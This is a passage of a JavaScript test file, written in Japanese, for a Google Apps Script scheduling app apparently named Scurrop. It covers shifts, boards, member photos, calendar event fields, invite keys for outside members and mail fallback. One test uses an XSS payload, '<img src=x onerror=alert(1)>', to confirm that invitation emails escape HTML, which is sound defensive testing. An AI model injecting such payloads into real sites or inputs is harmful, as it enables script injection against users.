  ok('ボードの名前と色を変えると、メンバーとテンプレートのボード名も直る', r.boards[0].name === '訪問スタッフ' && r.boards[0].color === '#9334E6' && r.members.filter(m => m.board === '訪問スタッフ').length === 2 && r.templates[0].board === '訪問スタッフ' && r.boards.length === 2);
  throws('ほかのボードと同じ名前には変えられない', () => a5.updateBoard('訪問スタッフ', { name: '配送', color: '#9334E6' }), /同じ名前/);
  throws('ないボードは変えられない', () => a5.updateBoard('ない', { name: 'x', color: '#9334E6' }), /見つかりません/);
  throws('色の形が違えば拒否', () => a5.updateBoard('配送', { name: '配送', color: 'red' }), /色/);
  r = a5.updateBoard('配送', { name: '配送', color: '#007B83' });
  ok('色だけ変えられる', r.boards[1].color === '#007B83' && r.boards[1].name === '配送');
  r = a5.deleteBoard('訪問スタッフ');
  ok('ボードを消すと、メンバーとテンプレートはボードなし（デフォルト）に移る。メンバーは消えない', r.boards.length === 1 && r.members.length === 4 && r.members.filter(m => m.board === '').length === 3 && r.templates[0].board === '');
  ok('消したボードは、開き直しても戻らない', a5.getState().boards.length === 1);
  throws('ないボードは消せない', () => a5.deleteBoard('訪問スタッフ'), /見つかりません/);
  e5.user = 'sato@example.com';
  throws('メンバーはボードを変えられない', () => a5.updateBoard('配送', { name: 'x', color: '#007B83' }), /管理者/);
  throws('メンバーはボードを消せない', () => a5.deleteBoard('配送'), /管理者/);
  e5.user = 'admin@example.com';
  ok('表示する時間は、決めていなければ 8〜18 時', a5.getState().project.hours.join() === '8,18');
  r = a5.setProject({ name: '訪問サービス', icon: '', fav: '', hours: [6, 22] });
  ok('表示する時間を変えられる', r.project.hours.join() === '6,22');
  r = a5.setProject({ name: '訪問 2', icon: '', fav: '' });
  ok('時間を送らなければ、そのまま残る。名前を変えるとタブの表示も変わる', r.project.hours.join() === '6,22' && a5.doGet({}).title === 'Scurrop | 訪問 2');
  throws('終了が開始より前の時間は拒否', () => a5.setProject({ name: 'x', hours: [10, 9] }), /時間/);
  throws('24 時を超える時間は拒否', () => a5.setProject({ name: 'x', hours: [8, 25] }), /時間/);
  throws('小数の時間は拒否', () => a5.setProject({ name: 'x', hours: [8.5, 18] }), /時間/);
  a5.resetProject();
  ok('リセットで表示する時間も消える', Object.keys(e5.props).filter(k => k !== 'URL_LIST').length === 0);
}

// シフト（繰り返しつき。見え方のためで、タスクの登録は縛らない）
{
  const e6 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a6 = e6.api; e6.now = at(8); a6.setup();
  const DAY = 86400000; const ds = (off) => { const d = new Date(day.getFullYear(), day.getMonth(), day.getDate() + off); return d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0'); };
  const t0 = (off) => new Date(day.getFullYear(), day.getMonth(), day.getDate() + off).getTime();
  a6.addMember({ email: 'sato@example.com', name: '佐藤', board: '訪問' });
  a6.addMember({ email: 'suzuki@example.com', name: '鈴木', board: '訪問' });
  let r = a6.getState();
  ok('シフトは最初は空で、誰も「シフトを使う人」ではない', r.shifts.length === 0 && r.shiftUsers.length === 0);
  r = a6.saveShift({ member: 'sato@example.com', date: ds(0), start: '9:00', end: '18:00', repeat: 'none' });
  ok('その日だけのシフトを入れられる', r.shifts.length === 1 && r.shifts[0].start === at(9) && r.shifts[0].end === at(18) && r.shifts[0].repeat === 'none' && r.shifts[0].date === ds(0) && r.shiftUsers.join() === 'sato@example.com');
  ok('その日だけのシフトは、次の日には出ない', a6.getState({ day: ds(1) }).shifts.length === 0);
  r = a6.saveShift({ member: 'suzuki@example.com', date: ds(0), start: '10:00', end: '15:00', repeat: 'daily', until: ds(2) });
  ok('毎日のシフトは、終わりの日まで出る', [0, 1, 2].every(k => a6.getState({ day: ds(k) }).shifts.some(x => x.member === 'suzuki@example.com' && x.start === t0(k) + 10 * 3600000)) && !a6.getState({ day: ds(3) }).shifts.some(x => x.member === 'suzuki@example.com') && !a6.getState({ day: ds(-1) }).shifts.some(x => x.member === 'suzuki@example.com'));
  const wd = new Date(t0(1)).getDay(), wd2 = new Date(t0(3)).getDay();
  r = a6.saveShift({ member: 'sato@example.com', date: ds(1), start: '13:00', end: '17:30', repeat: 'weekly', days: [wd, wd2, wd, 9] });
  const weekly = a6.getState({ day: ds(1) }).shifts.filter(x => x.repeat === 'weekly')[0];
  ok('毎週のシフトは、選んだ曜日にだけ出る（同じ曜日の重複や変な値は捨てる）', weekly && weekly.days.length === 2 && weekly.end === t0(1) + 17.5 * 3600000 && a6.getState({ day: ds(3) }).shifts.some(x => x.id === weekly.id) && !a6.getState({ day: ds(2) }).shifts.some(x => x.id === weekly.id) && a6.getState({ day: ds(8) }).shifts.some(x => x.id === weekly.id) && !a6.getState({ day: ds(-6) }).shifts.some(x => x.id === weekly.id));
  r = a6.deleteShift(weekly.id, ds(8));
  ok('繰り返しのシフトを「その日だけ」外せる', !a6.getState({ day: ds(8) }).shifts.some(x => x.id === weekly.id) && a6.getState({ day: ds(1) }).shifts.some(x => x.id === weekly.id) && a6.getState({ day: ds(15) }).shifts.some(x => x.id === weekly.id));
  r = a6.saveShift({ id: weekly.id, member: 'sato@example.com', date: ds(1), start: '14:00', end: '18:00', repeat: 'weekly', days: [wd] });
  ok('シフトを変えられる（外した日はそのまま）', a6.getState({ day: ds(1) }).shifts.filter(x => x.id === weekly.id)[0].start === t0(1) + 14 * 3600000 && !a6.getState({ day: ds(3) }).shifts.some(x => x.id === weekly.id) && !a6.getState({ day: ds(8) }).shifts.some(x => x.id === weekly.id));
  r = a6.deleteShift(weekly.id);
  ok('シフトをすべて消せる', !a6.getState({ day: ds(1) }).shifts.some(x => x.id === weekly.id) && !a6.getState({ day: ds(15) }).shifts.some(x => x.id === weekly.id));
  throws('終了が開始より前のシフトは拒否', () => a6.saveShift({ member: 'sato@example.com', date: ds(0), start: '18:00', end: '9:00' }), /時刻/);
  throws('日付のないシフトは拒否', () => a6.saveShift({ member: 'sato@example.com', date: '明日', start: '9:00', end: '18:00' }), /日付/);
  throws('ない日付（2 月 31 日）は拒否', () => a6.saveShift({ member: 'sato@example.com', date: '2026-02-31', start: '9:00', end: '18:00' }), /日付/);
  throws('毎週なのに曜日なしは拒否', () => a6.saveShift({ member: 'sato@example.com', date: ds(0), start: '9:00', end: '18:00', repeat: 'weekly', days: [] }), /曜日/);
  throws('終わりの日が始まりより前は拒否', () => a6.saveShift({ member: 'sato@example.com', date: ds(0), start: '9:00', end: '18:00', repeat: 'daily', until: ds(-1) }), /終了日/);
  throws('未登録メンバーのシフトは拒否', () => a6.saveShift({ member: 'no@example.org', date: ds(0), start: '9:00', end: '18:00' }), /登録されていません/);
  throws('ないシフトは消せない', () => a6.deleteShift('nope'), /見つかりません/);
  r = a6.createTask({ title: '時間外', member: 'sato@example.com', start: at(20), end: at(21) });
  r = a6.createTask({ title: 'シフトなしの日', member: 'sato@example.com', start: t0(5) + 9 * 3600000, end: t0(5) + 10 * 3600000 });
  ok('シフトの外の時間や、シフトのない日にもタスクを登録できる（縛りにしない）', a6.getState().tasks.some(t => t.title === '時間外') && a6.getState({ day: ds(5) }).tasks.length === 1);
  // 週の表示
  ok('週を頼まなければ、週の要約は付かない', a6.getState().week === null);
  r = a6.getState({ week: true });
  const mon = new Date(day.getFullYear(), day.getMonth(), day.getDate() - (day.getDay() + 6) % 7).getTime();
  const todayIx = (day.getDay() + 6) % 7;
  ok('週の表示は、月曜から 7 日ぶんのタスクとシフトを返す', r.week.length === 7 && r.week[0].dayStart === mon && new Date(r.week[6].dayStart).getDay() === 0 && r.week[todayIx].tasks.some(t => t.title === '時間外') && r.week[todayIx].shifts.some(x => x.member === 'sato@example.com'));
  r = a6.getState({ day: ds(7), week: true });
  ok('別の週を指定できる', r.week[0].dayStart === new Date(day.getFullYear(), day.getMonth(), day.getDate() - (day.getDay() + 6) % 7 + 7).getTime() && r.week.every(d => !d.tasks.some(t => t.title === '時間外')));
  ok('週の要約のタスクは、要点だけ（値やメモは載せない）', Object.keys(a6.getState({ week: true }).week[todayIx].tasks[0]).sort().join() === 'end,id,member,start,status,title');
  e6.user = 'suzuki@example.com';
  ok('メンバーには、週の表示でも自分のタスクとシフトだけ届く', a6.getState({ week: true }).week.every(d => d.tasks.every(t => t.member === 'suzuki@example.com') && d.shifts.every(x => x.member === 'suzuki@example.com')));
  e6.user = 'sato@example.com';
  r = a6.getState();
  ok('メンバーには自分のシフトだけ届く', r.shifts.length === 1 && r.shifts[0].member === 'sato@example.com' && r.shiftUsers.join() === 'sato@example.com');
  throws('メンバーはシフトを入れられない', () => a6.saveShift({ member: 'sato@example.com', date: ds(0), start: '9:00', end: '18:00' }), /管理者/);
  throws('メンバーはシフトを消せない', () => a6.deleteShift(r.shifts[0].id), /管理者/);
  e6.user = 'admin@example.com';
  delete e6.sheets.shifts; e6.props.SCHEMA = '4';
  ok('前の版から上げると、シフトのシートが自動で足される', a6.getState().shifts.length === 0 && !!e6.sheets.shifts);
}

// メンバーの写真
{
  const e8 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a8 = e8.api; e8.now = at(8); a8.setup();
  const PX = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
  const JP = 'data:image/jpeg;base64,' + 'A'.repeat(9000);
  a8.addMember({ email: 'sato@example.com', name: '佐藤', board: '訪問' });
  a8.addMember({ email: 'suzuki@example.com', name: '鈴木', board: '訪問' });
  let r = a8.getState();
  ok('写真は最初はなく、番号も空', r.members.every(m => m.photoRev === '') && Object.keys(a8.getPhotos(['sato@example.com'])).length === 0);
  r = a8.setMemberPhoto('Sato@example.com', JP);
  const rev1 = r.members.filter(m => m.email === 'sato@example.com')[0].photoRev;
  ok('写真を入れると番号が付き、15 秒おきの更新には画像そのものは載らない', !!rev1 && JSON.stringify(r).length < 9000 && r.members.filter(m => m.email === 'suzuki@example.com')[0].photoRev === '');
  ok('写真を取り出せる', a8.getPhotos(['sato@example.com', 'suzuki@example.com'])['sato@example.com'] === JP && Object.keys(a8.getPhotos(['sato@example.com', 'suzuki@example.com'])).length === 1);
  e8.now = at(8, 5);
  r = a8.setMemberPhoto('sato@example.com', PX);
  ok('写真を替えると番号が変わり、行は増えない', r.members.filter(m => m.email === 'sato@example.com')[0].photoRev !== rev1 && a8.getPhotos(['sato@example.com'])['sato@example.com'] === PX && e8.sheets.photos._d.length === 2);
  throws('画像でないものは拒否', () => a8.setMemberPhoto('sato@example.com', 'https://example.com/a.png'), /写真/);
  throws('大きすぎる写真は拒否', () => a8.setMemberPhoto('sato@example.com', 'data:image/jpeg;base64,' + 'A'.repeat(24001)), /写真/);
  throws('いないメンバーには入れられない', () => a8.setMemberPhoto('no@example.org', PX), /見つかりません/);
  a8.setMemberPhoto('suzuki@example.com', JP);
  e8.user = 'sato@example.com';
  ok('メンバーは自分の写真だけ取り出せる', Object.keys(a8.getPhotos(['sato@example.com', 'suzuki@example.com'])).join() === 'sato@example.com' && a8.getState().members[0].photoRev !== '');
  throws('メンバーは写真を変えられない', () => a8.setMemberPhoto('sato@example.com', PX), /管理者/);
  e8.user = 'admin@example.com';
  r = a8.setMemberPhoto('sato@example.com', '');
  ok('写真を消すと番号が空に戻り、頭文字になる', r.members.filter(m => m.email === 'sato@example.com')[0].photoRev === '' && Object.keys(a8.getPhotos(['sato@example.com'])).length === 0);
  delete e8.sheets.photos; { const d = e8.sheets.members._d; const i = d[0].indexOf('photo_rev'); d.forEach(x => x.splice(i, 1)); } e8.props.SCHEMA = '5';
  r = a8.getState();
  ok('前の版から上げると、写真のシートと列が自動で足される', !!e8.sheets.photos && e8.sheets.members._d[0].indexOf('photo_rev') >= 0 && r.members.length === 3);
}

// 住所と、カレンダーの予定の形
{
  const e11 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a11 = e11.api; e11.now = at(8); a11.setup();
  a11.addMember({ email: 'sato@example.com', name: '佐藤', board: '訪問' });
  let r = a11.createTask({ title: '訪問', member: 'sato@example.com', start: at(9), end: at(10), address: '東京都港区高輪 3-12 / 302', memo: 'オートロックあり\n到着時に連絡' });
  const t = r.tasks[0]; const ev = e11.events[0];
  ok('住所はタスクに残り、予定の「場所」に入る', t.address === '東京都港区高輪 3-12 / 302' && ev.o.location === '東京都港区高輪 3-12 / 302');
  ok('予定の説明は「メモ：」「URL：」の形になる', ev.o.description === 'メモ：\nオートロックあり\n到着時に連絡\n\nURL：\n' + r.url + '?task=' + t.id);
  r = a11.createTask({ title: 'メモなし', member: 'sato@example.com', start: at(11), end: at(12) });
  ok('住所もメモもなければ、場所は空で、説明は URL だけ', e11.events[1].o.location === undefined && e11.events[1].o.description === 'URL：\n' + r.url + '?task=' + r.tasks.filter(x => x.title === 'メモなし')[0].id);
  a11.linkTasks(t.id, r.tasks.filter(x => x.title === 'メモなし')[0].id, '引き継ぎ', false);
  ok('リンクすると、説明の最後に「リンク：」が足される（メモと URL はそのまま）', /^メモ：\nオートロックあり\n到着時に連絡\n\nURL：\n[^\n]+\n\nリンク：\n（引き継ぎ）メモなし 11:00–12:00 佐藤$/.test(e11.events[0].o.description));
  r = a11.editTask(t.id, { title: '訪問', member: 'sato@example.com', start: at(9), end: at(10), address: '東京都港区白金台 1-4', memo: 'オートロックあり\n到着時に連絡' });
  const live = e11.events.filter(x => !x.deleted && x.title === '訪問')[0];
  ok('住所を変えると、予定の場所も変わり、履歴に残る', r.tasks.filter(x => x.id === t.id)[0].address === '東京都港区白金台 1-4' && live.o.location === '東京都港区白金台 1-4' && /住所/.test(r.history[0].note) && /リンク：/.test(live.o.description));
  r = a11.editTask(t.id, { title: '訪問', member: 'sato@example.com', start: at(9), end: at(10), address: '', memo: '' });
  ok('住所とメモを消せる', r.tasks.filter(x => x.id === t.id)[0].address === '' && e11.events.filter(x => !x.deleted && x.title === '訪問')[0].o.location === undefined);
  delete e11.props.SCHEMA; { const d = e11.sheets.tasks._d; const i = d[0].indexOf('address'); d.forEach(x => x.splice(i, 1)); } e11.props.SCHEMA = '6';
  ok('前の版から上げると、住所の列が自動で足される', a11.getState().tasks.every(x => x.address === '') && e11.sheets.tasks._d[0].indexOf('address') >= 0);
}

// 速さ: 1 回の呼び出しの中で、同じ設定やシートを何度も読みに行かない
{
  const e16 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a16 = e16.api; e16.now = at(8); a16.setup();
  a16.addMember({ email: 'sato@example.com', name: '佐藤', board: '訪問' });
  a16.addMember({ email: 'suzuki@example.com', name: '鈴木', board: '配送' });
  for (let i = 0; i < 5; i++) a16.createTask({ title: '訪問' + i, member: 'sato@example.com', start: at(9 + i), end: at(10 + i) });
  const count = (fn) => { e16.reads = { props: 0, sheets: 0, open: 0 }; fn(); return Object.assign({}, e16.reads); };
  let c = count(() => a16.getState());
  ok('15 秒おきの更新（管理者）: 設定は 1 回、スプレッドシートは 1 回開くだけ、シートの読み込みは 12 回以内 → ' + JSON.stringify(c), c.props === 1 && c.open === 1 && c.sheets <= 12);
  e16.user = 'sato@example.com';
  c = count(() => a16.getState());
  ok('15 秒おきの更新（メンバー）: 同じく少ない読み込みで済む → ' + JSON.stringify(c), c.props === 1 && c.open === 1 && c.sheets <= 10);
  e16.user = 'admin@example.com';
  c = count(() => a16.createTask({ title: '追加', member: 'sato@example.com', start: at(15), end: at(16) }));
  ok('タスクの追加: 設定の読み込みは 2 回以内（ロックの前後）、スプレッドシートを開くのも 2 回以内 → ' + JSON.stringify(c), c.props <= 2 && c.open <= 2 && c.sheets <= 24);
  // 履歴が増えても、読むのは最後の分だけ
  const hist = e16.sheets.history._d; const row = hist[1].slice();
  for (let i = 0; i < 2000; i++) { const r2 = row.slice(); r2[0] = at(7) - (2000 - i) * 1000; hist.splice(1, 0, r2); }
  let r = a16.getState();
  ok('履歴が 2000 行増えても、今日の分は変わらず出る（最後の 600 行だけ読む）', r.history.length > 0 && r.history.every(h => h.time >= at(0)) && r.history.some(h => h.action === 'create'));
  // 書いた直後に読むと、新しい内容が返る（覚え書きが古いままにならない）
  r = a16.updateMember('sato@example.com', { name: '佐藤 改', role: 'member', board: '配送' });
  ok('書いた直後の状態に、書いた内容が入っている', r.members.filter(m => m.email === 'sato@example.com')[0].name === '佐藤 改' && r.members.filter(m => m.email === 'sato@example.com')[0].board === '配送');
  r = a16.deleteBoard('訪問');
  ok('消した直後の状態から、消したものがなくなっている', !r.boards.some(b => b.name === '訪問'));
  // シートを手で直しても、次の呼び出しで追いつく
  { const d = e16.sheets.tasks._d; const i = d[0].indexOf('title'); d[1][i] = '手で直した名前'; }
  ok('スプレッドシートを手で直すと、次の更新で画面に出る', a16.getState().tasks.some(t => t.title === '手で直した名前'));
}

// 招待（登録すると「参加しますか？」のメールが届き、本人が参加する。組織の外の人は、メールのリンクの鍵で見分ける）
{
  const e12 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a12 = e12.api; e12.now = at(8); e12.autoJoin = false;
  a12.initProject({ name: '訪問サービス' });
  let r = a12.getState();
  ok('公開した本人は、最初から参加済み', r.members.length === 1 && r.invited.length === 0);
  // 組織の中の人
  r = a12.addMember({ email: 'sato@example.com', name: '佐藤', board: '訪問' });
  ok('登録すると「招待中」になり、ボードのメンバーにはまだ出ない', r.members.length === 1 && r.invited.length === 1 && r.invited[0].email === 'sato@example.com' && r.invited[0].outside === false && r.notice === '');
  const html12 = e12.mails[0].options.htmlBody;
  ok('招待のメールは HTML でも送られ、Scurrop の名前・プロジェクト名・「参加する」のボタンが入る', />Scurrop</.test(html12) && /訪問サービス のボードに参加しますか？/.test(html12) && />参加する<\/a>/.test(html12) && /#1F2E38/.test(html12));
  ok('招待のメールには画像などの添付を付けず、送り主の名前も変えない（迷惑メールと見られにくくするため）', !e12.mails[0].options.inlineImages && !e12.mails[0].options.attachments && !e12.mails[0].options.name && !/cid:|<img/.test(html12));
  ok('HTML のボタンのリンクは、文字だけのメールのリンクと同じ', html12.includes('href="' + (e12.mails[0].body.match(/https:\S+/) || [''])[0] + '"'));
  ok('招待のメールが「Scurrop | プロジェクト名 のボードに参加しますか？」で届く', e12.mails.length === 1 && e12.mails[0].to === 'sato@example.com' && e12.mails[0].subject === 'Scurrop | 訪問サービス のボードに参加しますか？' && /admin さんから/.test(e12.mails[0].body));
  ok('組織の中の人への招待には、鍵を付けない（アカウントで見分ける）', !/[?&]k=/.test(e12.mails[0].body) && /https:\/\/script\.google\.com\//.test(e12.mails[0].body));
  throws('招待中のメンバーには、タスクを割り当てられない', () => a12.createTask({ title: 'x', member: 'sato@example.com', start: at(9), end: at(10) }), /登録されていません/);
  throws('招待中のメンバーには、シフトも入れられない', () => a12.saveShift({ member: 'sato@example.com', date: '2026-11-14', start: '9:00', end: '18:00' }), /登録されていません/);
  e12.user = 'sato@example.com';
  r = a12.getState();
  ok('招待された本人が開くと、参加の画面に要るものだけ届く', r.me.role === 'invited' && r.invite.project === '訪問サービス' && r.invite.board === '訪問' && r.tasks.length === 0 && r.members.length === 0 && r.boards.length === 0);
  r = a12.joinProject({ name: '佐藤 美咲' });
  ok('参加すると、メンバーとして入れる（表示名はここで直せる）', r.me.role === 'member' && r.me.name === '佐藤 美咲' && r.members.length === 1 && r.members[0].email === 'sato@example.com');
  e12.user = 'admin@example.com';
  r = a12.getState();
  ok('参加すると、ボードのメンバーに出て、割り当てられる', r.members.length === 2 && r.invited.length === 0 && a12.createTask({ title: '訪問', member: 'sato@example.com', start: at(9), end: at(10) }).tasks.length === 1);
  throws('参加済みの人に招待は送り直せない', () => a12.resendInvite('sato@example.com'), /参加済み/);
  // 組織の外の人
  e12.mails.length = 0;
  r = a12.addMember({ email: 'Guest@Gmail.com', name: '外の人', board: '訪問' });
  ok('組織の外のアドレスも登録できる（招待中、外の人の印つき）', r.invited.length === 1 && r.invited[0].email === 'guest@gmail.com' && r.invited[0].outside === true);
  const link = (e12.mails[0].body.match(/https:\S+/) || [''])[0]; const k1 = (link.match(/[?&]k=([A-Za-z0-9._-]+)/) || [])[1];
  ok('組織の外の人へのリンクは、組織の名前が入らない形（/macros/s/…）になる。組織の中の人へのリンクは今までどおり', /^https:\/\/script\.google\.com\/macros\/s\/TEST\/exec\?k=/.test(link) && !/\/a\/macros\//.test(link) && /\/a\/macros\/example\.com\//.test(a12.getState().url));
  ok('組織の外の人への招待には、本人だけの鍵が付く', e12.mails[0].to === 'guest@gmail.com' && !!k1 && k1.length > 30);
  ok('鍵の材料はシートにあるが、鍵そのものはシートに書かれていない', !JSON.stringify(e12.sheets.members._d).includes(k1) && !JSON.stringify(e12.sheets.members._d).includes(k1.split('.')[1]) && !!e12.props.KEY_SECRET);
  e12.user = '';
  throws('組織の外の人が鍵なしで開いても、中に入れない', () => a12.getState(), /アカウントを確認できません/);
  throws('でたらめな鍵では入れない', () => a12.getState({ key: k1.split('.')[0] + '.' + 'A'.repeat(32) }), /アカウントを確認できません/);
  r = a12.getState({ key: k1 });
  ok('鍵つきで開くと、招待された本人として参加の画面になる', r.me.role === 'invited' && r.me.email === 'guest@gmail.com' && r.me.via === 'key' && r.invite.project === '訪問サービス');
  ok('ページにも鍵が渡る（プロジェクト名はタブに出る）', JSON.parse(a12.doGet({ parameter: { k: k1 } }).boot).key === k1 && a12.doGet({ parameter: { k: k1 } }).title === 'Scurrop | 訪問サービス' && a12.doGet({ parameter: {} }).title === 'Scurrop');
  r = a12.joinProject({ key: k1, name: '' });
  ok('鍵で参加できる（名前を空にしたら、登録の名前のまま）', r.me.role === 'member' && r.me.name === '外の人');
  e12.user = 'admin@example.com';
  r = a12.createTask({ title: '外の仕事', member: 'guest@gmail.com', start: at(11), end: at(12), memo: 'よろしく' });
  const ot = r.tasks.filter(t => t.title === '外の仕事')[0]; const oev = e12.events[e12.events.length - 1];
  ok('組織の外のメンバーの予定のリンクには、本人の鍵が付く。組織の中のメンバーの予定には付かない', oev.o.description.includes('https://script.google.com/macros/s/TEST/exec?task=' + ot.id + '&k=' + k1) && !/[?&]k=/.test(e12.events[0].o.description));
  e12.user = '';
  r = a12.getState({ key: k1 });
  ok('鍵で開くと、自分のタスクだけ見える', r.tasks.length === 1 && r.tasks[0].id === ot.id && r.members.length === 1);
  r = a12.updateTask(ot.id, 'start', { key: k1, note: '出発' });
  r = a12.updateTask(ot.id, 'done', { key: k1 });
  ok('鍵で開始・完了できる', r.tasks[0].status === 'done' && r.me.email === 'guest@gmail.com');
  throws('鍵がなければ操作できない', () => a12.updateTask(ot.id, 'start', {}), /アカウントを確認できません/);
  throws('鍵では管理者の操作はできない', () => a12.createTask({ title: 'x', start: at(9), end: at(10) }), /アカウントを確認できません|管理者/);
  ok('鍵で自分の写真だけ取り出せる', Object.keys(a12.getPhotos(['sato@example.com', 'guest@gmail.com'], k1)).length === 0);
  // 鍵は、組織の中の人には使えない（転送されたリンクで、ほかの人になりすませない）
  e12.user = 'admin@example.com';
  throws('組織の外の人は、管理者にできない', () => a12.updateMember('guest@gmail.com', { name: '外の人', role: 'admin', board: '訪問' }), /同じ組織/);
  // メールの HTML に、名前などがそのまま入らない
  a12.setProject({ name: '<b>x</b>&"\'' });
  a12.updateMember('admin@example.com', { name: '<img src=x onerror=alert(1)>', role: 'admin', board: '' });
  e12.mails.length = 0;
  a12.addMember({ email: 'esc@example.com', name: 'esc', board: '' });
  ok('プロジェクト名や名前に「<」などが入っていても、メールの HTML では文字として出る', !/<b>x<\/b>/.test(e12.mails[0].options.htmlBody) && /&lt;b&gt;x&lt;\/b&gt;&amp;&quot;&#39;/.test(e12.mails[0].options.htmlBody) && !/<img src=x/.test(e12.mails[0].options.htmlBody) && /&lt;img src=x onerror=alert\(1\)&gt;/.test(e12.mails[0].options.htmlBody));
  a12.removeMember('esc@example.com'); a12.setProject({ name: '訪問サービス' }); a12.updateMember('admin@example.com', { name: 'admin', role: 'admin', board: '' });
  // 送り直しと取り消し
  e12.mails.length = 0;
  r = a12.addMember({ email: 'new@gmail.com', name: '新人', board: '' });
  const kOld = (e12.mails[0].body.match(/[?&]k=([A-Za-z0-9._-]+)/) || [])[1];
  r = a12.resendInvite('new@gmail.com');
  const kNew = (e12.mails[1].body.match(/[?&]k=([A-Za-z0-9._-]+)/) || [])[1];
  e12.user = '';
  ok('招待を送り直すと新しい鍵になり、前のメールのリンクは使えなくなる', e12.mails.length === 2 && kNew !== kOld && a12.getState({ key: kNew }).me.role === 'invited' && (() => { try { a12.getState({ key: kOld }); return false; } catch (e) { return true; } })());
  e12.user = 'admin@example.com';
  r = a12.removeMember('new@gmail.com');
  e12.user = '';
  ok('招待を取り消すと、そのリンクでは入れなくなる', (() => { try { a12.getState({ key: kNew }); return false; } catch (e) { return true; } })());
  // 招待のリンク（メールが届かないときや、メール以外で送りたいときのため）と、メールの確認
  e12.user = 'admin@example.com'; e12.mails.length = 0;
  r = a12.addMember({ email: 'in@example.com', name: '中の人', board: '' });
  r = a12.addMember({ email: 'out2@gmail.com', name: '外の人 2', board: '' });
  const lin = r.invited.filter(m => m.email === 'in@example.com')[0].link, lout = r.invited.filter(m => m.email === 'out2@gmail.com')[0].link;
  ok('管理者には、招待中の人のリンクが届く（組織の中の人は鍵なし、外の人は鍵つきで、メールのリンクと同じ）', /^https:\/\/script\.google\.com\/[^?]+$/.test(lin) && /\?k=n[0-9a-f]{15}\./.test(lout) && e12.mails[1].body.includes(lout) && e12.mails[0].body.includes(lin));
  e12.user = '';
  ok('コピーしたリンクの鍵で、外の人は参加の画面を開ける', a12.getState({ key: lout.split('?k=')[1] }).me.role === 'invited');
  e12.user = 'sato@example.com';
  ok('メンバーには、ほかの人の招待のリンクは届かない', !JSON.stringify(a12.getState()).includes('?k='));
  throws('メンバーはメールの確認を使えない', () => a12.testMail(), /管理者/);
  e12.user = 'admin@example.com'; e12.mails.length = 0;
  let tm = a12.testMail();
  ok('メールの確認: 自分あてに文字だけのメールを 1 通送り、結果を返す', tm.ok === true && tm.to === 'admin@example.com' && e12.mails.length === 1 && e12.mails[0].to === 'admin@example.com' && e12.mails[0].options === null && /メールの確認/.test(e12.mails[0].subject));
  e12.mailFail = true; tm = a12.testMail();
  ok('メールの確認: 送れなければ、理由を返す', tm.ok === false && /too many times/.test(tm.error));
  e12.mailFail = false;
  a12.removeMember('in@example.com'); a12.removeMember('out2@gmail.com');
  // 招待を送った結果は、必ず残る
  e12.user = 'admin@example.com'; e12.mails.length = 0;
  r = a12.addMember({ email: 'ok@example.com', name: 'ok', board: '' });
  ok('招待を送れたら、履歴に「招待 … に送信」と残り、「未送信」の印は付かない', r.history.some(h => h.action === 'invite' && /ok@example\.com に送信/.test(h.note)) && r.invited.filter(m => m.email === 'ok@example.com')[0].error === '' && r.notice === '' && r.mailLeft === -1 && r.mailVia === 'gmail');
  e12.htmlFail = true; e12.noGmail = true; e12.mails.length = 0;
  r = a12.resendInvite('ok@example.com');
  ok('予備の送り方で、HTML つきで送れないときは、文字だけのメールで送り直す', e12.mails.length === 1 && e12.mails[0].options === null && /参加する：/.test(e12.mails[0].body) && /予備の方法で送信しました/.test(r.notice));
  e12.htmlFail = false; e12.noGmail = false; e12.noUrl = true;
  r = a12.resendInvite('ok@example.com');
  ok('Web アプリの URL が取れないときは、黙って終わらず、理由が出て「未送信」の印が付く', /URL を取得できません/.test(r.notice) && /URL を取得できません/.test(r.invited.filter(m => m.email === 'ok@example.com')[0].error) && r.history.some(h => h.action === 'invite' && /送信に失敗/.test(h.note)));
  e12.noUrl = false; e12.quota = 0;
  r = a12.resendInvite('ok@example.com');
  ok('Gmail で送れるあいだは、予備の送り方の上限を使い切っていても送れる', r.notice === '');
  e12.noGmail = true;
  r = a12.resendInvite('ok@example.com');
  ok('予備の送り方で、今日のメールの上限を使い切っているときも、理由が出る', /上限に達しました/.test(r.notice));
  e12.quota = undefined; e12.noGmail = false;
  r = a12.resendInvite('ok@example.com');
  ok('送り直して届けば、「未送信」の印は消える', r.notice === '' && r.invited.filter(m => m.email === 'ok@example.com')[0].error === '');
  a12.removeMember('ok@example.com');
  // メールが送れないとき
  e12.user = 'admin@example.com'; e12.mailFail = true;
  r = a12.addMember({ email: 'x@gmail.com', name: 'x', board: '' });
  ok('招待のメールが送れなくても登録は残り、理由が返って「未送信」の印が付く', /招待メールを送信できませんでした/.test(r.notice) && r.invited.some(m => m.email === 'x@gmail.com' && /送信できませんでした/.test(m.error)));
  e12.mailFail = false;
  // 前の版のメンバー（status が空）は参加済みとして扱う
  { const d = e12.sheets.members._d; const i = d[0].indexOf('status'); d.forEach((row, n) => { if (n && row[0] === 'sato@example.com') row[i] = ''; }); }
  ok('前の版から居るメンバーは、参加済みとして扱う', a12.getState().members.some(m => m.email === 'sato@example.com'));
  a12.resetProject();
  ok('リセットで、鍵の秘密も消える', Object.keys(e12.props).filter(k => k !== 'URL_LIST').length === 0);
}

// メールの送り方（2026-11-14: MailApp で自動で送った招待が、受け取る側の Gmail に拒否された。本人のメールとして Gmail から送る）
{
  const e18 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a18 = e18.api; e18.now = at(8);
  a18.initProject({ name: '訪問サービス' });
  e18.autoJoin = false;
  let r = a18.addMember({ email: 'guest@gmail.com', name: '外の人', board: '' });
  const m0 = e18.mails[0];
  ok('招待は、Gmail から本人のメールとして送る', e18.mails.length === 1 && m0.via === 'gmail' && m0.to === 'guest@gmail.com' && r.notice === '');
